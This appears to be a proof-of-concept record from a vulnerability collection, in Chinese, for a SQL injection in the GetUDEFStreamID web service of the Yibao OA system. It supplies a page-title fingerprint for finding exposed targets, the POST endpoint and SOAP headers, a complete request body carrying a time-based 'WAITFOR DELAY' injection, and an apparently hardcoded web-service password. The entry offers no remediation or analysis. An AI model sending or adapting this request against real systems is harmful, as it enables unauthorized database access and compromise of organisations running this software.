# 易宝OAGetUDEFStreamID存在Sql注入漏洞

- **系统**：易宝　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="欢迎登录易宝OA系统"`
- **请求**：`POST /WebService/BasicService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetUDEFStreamID"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetUDEFStreamID xmlns="http://tempuri.org/">
<tableName>';WAITFOR DELAY '0:0:5'--</tableName>
<webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
</GetUDEFStreamID>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—